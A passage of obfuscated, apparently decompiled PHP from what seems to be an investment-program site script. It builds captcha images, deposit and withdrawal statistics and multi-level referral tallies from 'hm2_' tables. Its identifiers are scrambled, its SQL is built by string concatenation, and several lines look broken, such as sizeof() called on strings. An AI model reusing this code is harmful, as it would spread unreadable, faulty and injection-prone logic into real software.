                                                imagettftext ($elnlcfHpAA, $elnlcjfhkl[$i][$elnlcsyENS['elnlcdgIz']], $elnlcjfhkl[$i][$elnlcsyENS['elnlcUuADw']], $x, $elnlchkehH, $elnlcFbeuJ, $elnlceWfw, $elnlcECvOw[$i]);
                                                $x += $elnlcThqqF;
                                              }

                                              $w = $elnlcsyENS['elnlctPegD'];
                                              $h = floor (imagesx ($elnlcfHpAA) / ($h * imagesy ($elnlcfHpAA)));
                                              imagecopyresized ($elnlcfHpAA, $elnlcfHpAA, 0, 0, 0, 0, $w, $h, imagesx ($elnlcfHpAA), imagesy ($elnlcfHpAA));
                                              header ('Content-type: image/png');
                                              imagepng ($elnlcfHpAA);
                                              imagedestroy ($elnlcfHpAA);
                                            }
                                            else
                                            {
                                              if (($elnlcSuVc[$elnlcsyENS['elnlcpBapj']] == 1 AND function_exists ('imagettfbbox')))
                                              {
                                                $elnlcQayp = $elnlcsyENS['elnlcmjUx'];
                                                $elnlcpREy = $elnlcsyENS['elnlcmjUx'];
                                                $elnlceWfw = './fonts/font.ttf';
                                                $elnlcjfhkl = array ();
                                                $elnlcTOPL = $elnlcsyENS['elnlcmjUx'];
                                                for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($elnlcECvOw); ++$i)
                                                {
                                                  $elnlcBKsM = rand ($elnlcSuVc[$elnlcsyENS['elnlcfPgDr']], $elnlcSuVc[$elnlcsyENS['elnlcitBa']]);
                                                  $elnlcrwaW = rand (-10, 10);
                                                  $elnlcEhTj = imagettfbbox ($elnlcBKsM, $elnlcrwaW, $elnlceWfw, $elnlcECvOw[$i]);
                                                  $elnlchkehH = max ($elnlcEhTj[1], $elnlcEhTj[3], $elnlcEhTj[5], $elnlcEhTj[7]) - min ($elnlcEhTj[1], $elnlcEhTj[3], $elnlcEhTj[5], $elnlcEhTj[7]);
                                                  $elnlcThqqF = max ($elnlcEhTj[0], $elnlcEhTj[2], $elnlcEhTj[4], $elnlcEhTj[6]) - min ($elnlcEhTj[0], $elnlcEhTj[2], $elnlcEhTj[4], $elnlcEhTj[6]) + 1;
                                                  $elnlcjfhkl[$i] = array ('size' => $elnlcBKsM, 'angle' => $elnlcrwaW, 'width' => $elnlcThqqF + 2, 'height' => $elnlchkehH);
                                                  $elnlcQayp += $elnlcThqqF + 2;
                                                  if ($elnlcpREy < $elnlchkehH)
                                                  {
                                                    $elnlcpREy = $elnlchkehH;
                                                    continue;
                                                  }
                                                }

                                                $elnlcfHpAA = imagecreate ($elnlcQayp + 4, $elnlcpREy + 4);
                                                $elnlcBwPM = imagecolorallocate ($elnlcfHpAA, $elnlcIWALM, $elnlceIix, $elnlcvbCg);
                                                $elnlcFbeuJ = imagecolorallocate ($elnlcfHpAA, $elnlcqiEz, $elnlcxcqvD, $elnlcPsGUK);
                                                for ($i = $elnlcsyENS['elnlcmjUx']; $i < 1000; ++$i)
                                                {
                                                  imagesetpixel ($elnlcfHpAA, rand (0, $elnlcQayp + 4), rand (0, $elnlcpREy + 4), $elnlcFbeuJ);
                                                }

                                                $x = $elnlcsyENS['elnlcwshtO'];
                                                for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($elnlcECvOw); ++$i)
                                                {
                                                  $elnlcBKsM = $elnlcsyENS['elnlcIbwW'];
                                                  $elnlcEhTj = imagettfbbox ($elnlcBKsM, $elnlcrwaW, $elnlceWfw, $elnlcECvOw[$i]);
                                                  $elnlchkehH = $elnlcpREy;
                                                  $elnlcThqqF = $elnlcjfhkl[$i][$elnlcsyENS['elnlcUcbao']];
                                                  $y = floor ($elnlcThqqF / 4);
                                                  imagettftext ($elnlcfHpAA, $elnlcjfhkl[$i][$elnlcsyENS['elnlcdgIz']], $elnlcjfhkl[$i][$elnlcsyENS['elnlcUuADw']], $x + rand (0 - $y, $y), $elnlchkehH - 3 + rand (-3, 3), $elnlcFbeuJ, $elnlceWfw, $elnlcECvOw[$i]);
                                                  $x += $elnlcThqqF;
                                                }

                                                header ('Content-type: image/png');
                                                imagepng ($elnlcfHpAA);
                                                imagedestroy ($elnlcfHpAA);
                                              }
                                              else
                                              {
                                                header ('Content-type: image/png');
                                                $elnlcfHpAA = @imagecreate (@imagefontwidth (5) * @strlen ($elnlcECvOw) + 2, @imagefontheight (5) + 2);
                                                $elnlcBwPM = imagecolorallocate ($elnlcfHpAA, $elnlcIWALM, $elnlceIix, $elnlcvbCg);
                                                $elnlcFbeuJ = imagecolorallocate ($elnlcfHpAA, $elnlcqiEz, $elnlcxcqvD, $elnlcPsGUK);
                                                imagestring ($elnlcfHpAA, 5, 1, 1, $elnlcECvOw, $elnlcFbeuJ);
                                                imagepng ($elnlcfHpAA);
                                                imagedestroy ($elnlcfHpAA);
                                              }
                                            }

                                            print base64_decode ('Cg==
');
                                          }
                                          else
                                          {
                                            if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlccVez'] AND $elnlcSuVc[$elnlcsyENS['elnlcMcsVe']]) AND $elnlcSuVc[$elnlcsyENS['elnlcrEsy']]))
                                            {
                                              function compare ($a, $b)
                                              {
                                                global $elnlcsyENS;
                                                return strcmp ($a[$elnlcsyENS['elnlczWew']], $b[$elnlcsyENS['elnlczWew']]);
                                              }

                                              $q = '
         select 
               count(distinct(user_id)) as cnt
         from 
               hm2_history 
         where 
               type in (\'deposit\', \'earning\', \'withdrawal\') and user_id != 1
        ';
                                              $q = 'select count(distinct(user_id)) as cnt
	from hm2_deposits';
                                              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                              $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                              $elnlcrldqi = $elnlcCgqPK[$elnlcsyENS['elnlchvME']];
                                              $q = 'select 
               u.username,
               h.type,
               sum(h.actual_amount) as amt
         from 
               hm2_users as u left outer join hm2_history as h
                 on u.id = h.user_id
         where h.type in (\'deposit\', \'earning\', \'withdrawal\') and user_id != 1
         group by
               h.type, u.username
        ';
                                              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                              $elnlcgvAk = array ();
                                              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                              {
                                                $elnlcgvAk[$elnlcCgqPK[$elnlcsyENS['elnlczWew']]][$elnlcCgqPK[$elnlcsyENS['elnlcsMIe']]] = $elnlcCgqPK[$elnlcsyENS['elnlcReqR']];
                                              }

                                              $elnlcfWPmm = array ();
                                              $elnlcNzlzE = array ();
                                              if ($elnlcgvAk)
                                              {
                                                foreach ($elnlcgvAk as $k => $elnlcCgqPK)
                                                {
                                                  $elnlcCgqPK[$elnlcsyENS['elnlczWew']] = $k;
                                                  $elnlcfWPmm[$elnlcsyENS['elnlcOBsC']] += abs ($elnlcCgqPK[$elnlcsyENS['elnlcOBsC']]);
                                                  $elnlcfWPmm[$elnlcsyENS['elnlczFIo']] += abs ($elnlcCgqPK[$elnlcsyENS['elnlczFIo']]);
                                                  $elnlcfWPmm[$elnlcsyENS['elnlcKCaAM']] += abs ($elnlcCgqPK[$elnlcsyENS['elnlcKCaAM']]);
                                                  $elnlcCgqPK[$elnlcsyENS['elnlcOBsC']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcOBsC']]), 2);
                                                  $elnlcCgqPK[$elnlcsyENS['elnlczFIo']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlczFIo']]), 2);
                                                  $elnlcCgqPK[$elnlcsyENS['elnlcKCaAM']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcKCaAM']]), 2);
                                                  array_push ($elnlcNzlzE, $elnlcCgqPK);
                                                }
                                              }

                                              $elnlcfWPmm[$elnlcsyENS['elnlcOBsC']] = number_format ($elnlcfWPmm[$elnlcsyENS['elnlcOBsC']], 2);
                                              $elnlcfWPmm[$elnlcsyENS['elnlczFIo']] = number_format ($elnlcfWPmm[$elnlcsyENS['elnlczFIo']], 2);
                                              $elnlcfWPmm[$elnlcsyENS['elnlcKCaAM']] = number_format ($elnlcfWPmm[$elnlcsyENS['elnlcKCaAM']], 2);
                                              $elnlcfhFg->assign ('total', $elnlcfWPmm);
                                              @usort ($elnlcNzlzE, compare);
                                              $elnlcBVch = $elnlcWodOE[$elnlcsyENS['elnlcoRdoK']];
                                              $elnlcnAdtA = $elnlcsyENS['elnlcUKVo'];
                                              $elnlcfKwd = ceil ($elnlcrldqi / $elnlcnAdtA);
                                              if ($elnlcBVch <= 1)
                                              {
                                                $elnlcBVch = $elnlcsyENS['elnlctNxTK'];
                                              }

                                              if ($elnlcfKwd < $elnlcBVch)
                                              {
                                                $elnlcBVch = $elnlcfKwd;
                                              }

                                              $elnlcQVmJ = ($elnlcBVch - 1) * $elnlcnAdtA;
                                              $elnlcNzlzE = array_slice ($elnlcNzlzE, $elnlcQVmJ, $elnlcnAdtA);
                                              $elnlcfhFg->assign ('stats', $elnlcNzlzE);
                                              $elnlcdwLbF = array ();
                                              for ($i = $elnlcsyENS['elnlctNxTK']; $i <= $elnlcfKwd; ++$i)
                                              {
                                                $elnlcyNBa = array ();
                                                $elnlcyNBa[$elnlcsyENS['elnlcoRdoK']] = $i;
                                                $elnlcyNBa[$elnlcsyENS['elnlcCdoEa']] = ($i == $elnlcBVch ? 1 : 0);
                                                array_push ($elnlcdwLbF, $elnlcyNBa);
                                              }

                                              $elnlcfhFg->assign ('pages', $elnlcdwLbF);
                                              $elnlcfhFg->assign ('colpages', $elnlcfKwd);
                                              $elnlcfhFg->assign ('current_page', $elnlcBVch);
                                              if (1 < $elnlcBVch)
                                              {
                                                $elnlcfhFg->assign ('prev_page', $elnlcBVch - 1);
                                              }

                                              if ($elnlcBVch < $elnlcfKwd)
                                              {
                                                $elnlcfhFg->assign ('next_page', $elnlcBVch + 1);
                                              }

                                              $elnlcfhFg->display ($elnlcsyENS['elnlcNrGd']);
                                            }
                                            else
                                            {
                                              if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcvyOW'] AND $elnlcSuVc[$elnlcsyENS['elnlcMcsVe']]) AND $elnlcSuVc[$elnlcsyENS['elnlcwPIzL']]))
                                              {
                                                $elnlcWodOE[$elnlcsyENS['elnlcKgqB']] = intval ($elnlcWodOE[$elnlcsyENS['elnlcKgqB']]);
                                                if ($elnlcWodOE[$elnlcsyENS['elnlcKgqB']] == 0)
                                                {
                                                  $elnlcWodOE[$elnlcsyENS['elnlcKgqB']] = date ('n', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                                                }

                                                $elnlcWodOE[$elnlcsyENS['elnlcryHea']] = intval ($elnlcWodOE[$elnlcsyENS['elnlcryHea']]);
                                                if ($elnlcWodOE[$elnlcsyENS['elnlcryHea']] == 0)
                                                {
                                                  $elnlcWodOE[$elnlcsyENS['elnlcryHea']] = date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                                                }

                                                $elnlcfhFg->assign ('frm', $elnlcWodOE);
                                                $elnlcdRCR = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcsyENS['elnlctqSz']);
                                                $elnlcfhFg->assign ('month', $elnlcdRCR);
                                                $elnlczLFnQ = array ();
                                                for ($i = $elnlcSuVc[$elnlcsyENS['elnlcArER']]; $i <= date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60); ++$i)
                                                {
                                                  array_push ($elnlczLFnQ, $i);
                                                }

                                                $elnlcfhFg->assign ('year', $elnlczLFnQ);
                                                $elnlckeTje = ' \'' . $elnlcWodOE[$elnlcsyENS['elnlcryHea']] . '\' = year(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour) and ' . '\'' . $elnlcWodOE[$elnlcsyENS['elnlcKgqB']] . '\' = month(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour) ';
                                                $elnlcgNwD = $elnlcsyENS['elnlcwQwQC'];
                                                $q = '' . '
        select 
              count(*) as cnt
        from 
              hm2_history 
        where 
              ' . $elnlckeTje . ' and type = \'' . $elnlcgNwD . '\' and user_id != 1
       ';
                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                $elnlcrldqi = $elnlcCgqPK[$elnlcsyENS['elnlchvME']];
                                                $elnlcBVch = intval ($elnlcWodOE[$elnlcsyENS['elnlcoRdoK']]);
                                                $elnlcnAdtA = $elnlcsyENS['elnlcUKVo'];
                                                $elnlcfKwd = ceil ($elnlcrldqi / $elnlcnAdtA);
                                                if ($elnlcBVch < 1)
                                                {
                                                  $elnlcBVch = $elnlcsyENS['elnlctNxTK'];
                                                }

                                                if (($elnlcfKwd < $elnlcBVch AND 1 < $elnlcfKwd))
                                                {
                                                  $elnlcBVch = $elnlcfKwd;
                                                }

                                                $elnlcQVmJ = ($elnlcBVch - 1) * $elnlcnAdtA;
                                                $q = 'select 
              u.username,
              h.type,
              h.actual_amount,
              date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as dd
        from 
              hm2_users as u left outer join hm2_history as h
                on u.id = h.user_id
        where ' . $elnlckeTje . ' and h.type = \'' . $elnlcgNwD . '\' and user_id != 1
        order by h.id desc
        limit ' . $elnlcQVmJ . ', ' . $elnlcnAdtA . '
       ');
                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                $elnlcgvAk = array ();
                                                $elnlcmxHsS = $elnlcsyENS['elnlcmjUx'];
                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                {
                                                  $elnlcmxHsS += abs ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]);
                                                  $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]), 2);
                                                  array_push ($elnlcgvAk, $elnlcCgqPK);
                                                }

                                                $elnlcfhFg->assign ('stats', $elnlcgvAk);
                                                $elnlcfhFg->assign ('total_withdraw', number_format ($elnlcmxHsS, 2));
                                                $elnlcdwLbF = array ();
                                                for ($i = $elnlcsyENS['elnlctNxTK']; $i <= $elnlcfKwd; ++$i)
                                                {
                                                  $elnlcyNBa = array ();
                                                  $elnlcyNBa[$elnlcsyENS['elnlcoRdoK']] = $i;
                                                  $elnlcyNBa[$elnlcsyENS['elnlcCdoEa']] = ($i == $elnlcBVch ? 1 : 0);
                                                  array_push ($elnlcdwLbF, $elnlcyNBa);
                                                }

                                                $elnlcfhFg->assign ('pages', $elnlcdwLbF);
                                                $elnlcfhFg->assign ('colpages', $elnlcfKwd);
                                                $elnlcfhFg->assign ('current_page', $elnlcBVch);
                                                if (1 < $elnlcBVch)
                                                {
                                                  $elnlcfhFg->assign ('prev_page', $elnlcBVch - 1);
                                                }

                                                if ($elnlcBVch < $elnlcfKwd)
                                                {
                                                  $elnlcfhFg->assign ('next_page', $elnlcBVch + 1);
                                                }

                                                $elnlcfhFg->display ($elnlcsyENS['elnlckgVdo']);
                                                print base64_decode ('Cg==
');
                                              }
                                              else
                                              {
                                                if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcKOleR'] AND $elnlcSuVc[$elnlcsyENS['elnlcMcsVe']]) AND $elnlcSuVc[$elnlcsyENS['elnlcsjQk']]))
                                                {
                                                  $q = 'select 
               u.username,
               sum(h.actual_amount) as balance,
               date_format(u.date_register + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour, \'%b-%e-%Y %r\') as dd
         from 
               hm2_users as u left outer join hm2_history as h
                 on u.id = h.user_id
         where h.type = \'deposit\' and u.id != 1 and u.status = \'on\'
         group by
               u.username, dd
         order by balance asc
         limit 0, 10
        ';
                                                  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                  $elnlcgvAk = array ();
                                                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                  {
                                                    $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcTcMv']]), 2);
                                                    array_push ($elnlcgvAk, $elnlcCgqPK);
                                                  }

                                                  $elnlcfhFg->assign ('top', $elnlcgvAk);
                                                  $elnlcfhFg->display ($elnlcsyENS['elnlcoxbW']);
                                                  print base64_decode ('Cg==
');
                                                }
                                                else
                                                {
                                                  if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcHyhOp'] AND $elnlcSuVc[$elnlcsyENS['elnlcMcsVe']]) AND $elnlcSuVc[$elnlcsyENS['elnlcqyjfM']]))
                                                  {
                                                    $q = 'select 
               u.username,
               h.actual_amount as balance,
               date_format(h.deposit_date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour, \'%b-%e-%Y %r\') as dd
         from 
               hm2_deposits as h left outer join hm2_users as u
                 on u.id = h.user_id
         where h.status = \'on\' and u.id != 1 and u.status = \'on\'
         order by deposit_date desc
         limit 0, 10
        ';
                                                    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                    $elnlcgvAk = array ();
                                                    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                    {
                                                      $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcTcMv']]), 2);
                                                      array_push ($elnlcgvAk, $elnlcCgqPK);
                                                    }

                                                    $elnlcfhFg->assign ('top', $elnlcgvAk);
                                                    $elnlcfhFg->display ($elnlcsyENS['elnlcsDaTH']);
                                                    print base64_decode ('Cg==
');
                                                  }
                                                  else
                                                  {
                                                    if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcirLe'] AND $elnlcSuVc[$elnlcsyENS['elnlcMcsVe']]) AND $elnlcSuVc[$elnlcsyENS['elnlcmLNAt']]))
                                                    {
                                                      if ($elnlcSuVc[refs10_start_date] == '')
                                                      {
                                                        $elnlcSuVc[$elnlcsyENS['elnlcbCnS']] = '2007-01-01';
                                                      }

                                                      $q = '' . 'select 
               u1.username,
               u1.id,
               count(*) as col
         from 
               hm2_users as u1 left outer join hm2_users as u2
                 on u1.id = u2.ref
         where u2.date_register > \'' . $elnlcSuVc[refs10_start_date] . '\' + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour
         group by
               u1.username
         having col > 0
         order by col desc, u1.id
         limit 0, 20
        ';
                                                      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                      $elnlcgvAk = array ();
                                                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                      {
                                                        $elnlcKihF = '' . 'select 
                  count(distinct u.id) as col
            from
                  hm2_users as u,
                  hm2_deposits as d
            where
                  u.ref = ' . $elnlcCgqPK[id] . ' and
                  u.id = d.user_id and
                  d.deposit_date > \'' . $elnlcSuVc[refs10_start_date] . '\' + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour
           ';
                                                        ($elnlcjSNE = mysql_query ($elnlcKihF) OR print mysql_error ());
                                                        $elnlcUpbus = mysql_fetch_array ($elnlcjSNE);
                                                        $elnlcCgqPK[active_col] = $elnlcUpbus[col];
                                                        array_push ($elnlcgvAk, $elnlcCgqPK);
                                                      }

                                                      $q = '' . 'select date_format(\'' . $elnlcSuVc[refs10_start_date] . '\' + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour, \'%b-%e-%Y\') as d';
                                                      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                      $elnlcfhFg->assign ('start_date', $elnlcCgqPK[d]);
                                                      $elnlcfhFg->assign ('stats', $elnlcgvAk);
                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcIvyS']);
                                                      print base64_decode ('Cg==
');
                                                    }
                                                    else
                                                    {
                                                      if ($HTTP_GET_VARS[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcWFcf'])
                                                      {
                                                        $elnlcfhFg->assign ('process', $elnlcWodOE[$elnlcsyENS['elnlcUJxW']]);
                                                        $elnlcfhFg->display ($elnlcsyENS['elnlcklvup']);
                                                        print base64_decode ('Cg==
');
                                                      }
                                                      else
                                                      {
                                                        if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcWFcf'])
                                                        {
                                                          $elnlcfhFg->assign ('process', $elnlcWodOE[$elnlcsyENS['elnlcUJxW']]);
                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcklvup']);
                                                          print base64_decode ('Cg==
');
                                                        }
                                                        else
                                                        {
                                                          if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcxRtr'] AND $elnlcSuVc[$elnlcsyENS['elnlcLfUAO']] == 1) AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                          {
                                                            $elnlcfhFg->assign ('site_name', $elnlcSuVc[$elnlcsyENS['elnlcIEsb']]);
                                                            if ($elnlcSuVc[use_names_in_referral_links] == 1)
                                                            {
                                                              $elnlcgcnET[name] = preg_replace ('/\\s+/', '_', $elnlcgcnET[name]);
                                                              $elnlcgcnET[username] = $elnlcgcnET[name];
                                                            }

                                                            $elnlcfhFg->assign ('user', $elnlcgcnET);
                                                            $elnlcfhFg->display ($elnlcsyENS['elnlcnMClm']);
                                                            print base64_decode ('Cg==
');
                                                          }
                                                          else
                                                          {
                                                            if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcJLxB'] AND $elnlcSuVc[$elnlcsyENS['elnlcLfUAO']] == 1) AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                            {
                                                              if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOQeK'])
                                                              {
                                                                $q = '' . 'select id from hm2_users where ref = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcKMBxa = array (-1);
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  array_push ($elnlcKMBxa, $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                                                                }

                                                                $elnlcHMVR = '(' . join (', ', $elnlcKMBxa) . ')';
                                                                $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits where status = \'on\' and user_id in ' . $elnlcHMVR;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcFnUg = $elnlcsyENS['elnlcmjUx'];
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  $elnlcFnUg = $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']];
                                                                }

                                                                $q = '' . 'select id from hm2_users where ref in ' . $elnlcHMVR;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcoLzzi = array (-1);
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  array_push ($elnlcoLzzi, $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                                                                }

                                                                $elnlciehr = '(' . join (', ', $elnlcoLzzi) . ')';
                                                                $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits where status = \'on\' and user_id in ' . $elnlciehr;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlccrPS = $elnlcsyENS['elnlcmjUx'];
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  $elnlccrPS = $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']];
                                                                }

                                                                $q = '' . 'select id from hm2_users where ref in ' . $elnlciehr;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcrVtN = array (-1);
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  array_push ($elnlcrVtN, $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                                                                }

                                                                $elnlcKidkz = '(' . join (', ', $elnlcrVtN) . ')';
                                                                $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits where status = \'on\' and user_id in ' . $elnlcKidkz;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcpdrN = $elnlcsyENS['elnlcmjUx'];
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  $elnlcpdrN = $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']];
                                                                }

                                                                $q = '' . 'select id from hm2_users where ref in ' . $elnlcKidkz;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcRbjgW = array (-1);
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  array_push ($elnlcRbjgW, $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                                                                }

                                                                $elnlcJGyub = '(' . join (', ', $elnlcRbjgW) . ')';
                                                                $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits where status = \'on\' and user_id in ' . $elnlcJGyub;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcMivrT = $elnlcsyENS['elnlcmjUx'];
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  $elnlcMivrT = $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']];
                                                                }

                                                                $q = '' . 'select id from hm2_users where ref in ' . $elnlcJGyub;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlczjalK = array (-1);
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  array_push ($elnlczjalK, $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                                                                }

                                                                $elnlcLppBR = '(' . join (', ', $elnlczjalK) . ')';
                                                                $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits where status = \'on\' and user_id in ' . $elnlcLppBR;
                                                                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                $elnlcUiWcR = $elnlcsyENS['elnlcmjUx'];
                                                                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                {
                                                                  $elnlcUiWcR = $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']];
                                                                }

                                                                $elnlcfhFg->assign ('refs1', sizeof ($elnlcHMVR) - 1);
                                                                $elnlcfhFg->assign ('deps1', $elnlcFnUg);
                                                                $elnlcfhFg->assign ('refs2', sizeof ($elnlciehr) - 1);
                                                                $elnlcfhFg->assign ('deps2', $elnlccrPS);
                                                                $elnlcfhFg->assign ('refs3', sizeof ($elnlcKidkz) - 1);
                                                                $elnlcfhFg->assign ('deps3', $elnlcpdrN);
                                                                $elnlcfhFg->assign ('refs4', sizeof ($elnlcJGyub) - 1);
                                                                $elnlcfhFg->assign ('deps4', $elnlcMivrT);
                                                                $elnlcfhFg->assign ('refs5', sizeof ($elnlcLppBR) - 1);
                                                                $elnlcfhFg->assign ('deps5', $elnlcUiWcR);
                                                              }

                                                              $elnlcfhFg->assign ('site_name', $elnlcSuVc[$elnlcsyENS['elnlcIEsb']]);
                                                              $q = 'select count(*) as col from hm2_users where status = \'on\' and ref=' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                              $elnlchGkPU = mysql_query ($q);
                                                              $elnlcfhFg->assign ('total_ref', 0);
                                                              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                              {
                                                                $elnlcfhFg->assign ('total_ref', $elnlcCgqPK[$elnlcsyENS['elnlckNCf']]);
                                                              }

                                                              $q = 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and hm2_deposits.user_id = hm2_users.id';
                                                              $elnlchGkPU = mysql_query ($q);
                                                              $elnlcfhFg->assign ('active_ref', 0);
                                                              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                              {
                                                                $elnlcfhFg->assign ('active_ref', $elnlcCgqPK[$elnlcsyENS['elnlckNCf']]);
                                                              }

                                                              $elnlcotDB = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                                                              $elnlcfhFg->assign ('commissions', number_format ($elnlcotDB[$elnlcsyENS['elnlcSGiR']], 2));
                                                              $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcHSUz']]);
                                                              $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcmEWD']]);
                                                              $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcMeCs']]);
                                                              $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']]);
                                                              $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcgjPm']]);
                                                              $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcQwVC']]);
                                                              if ($elnlcWodOE[$elnlcsyENS['elnlcHSUz']] == 0)
                                                              {
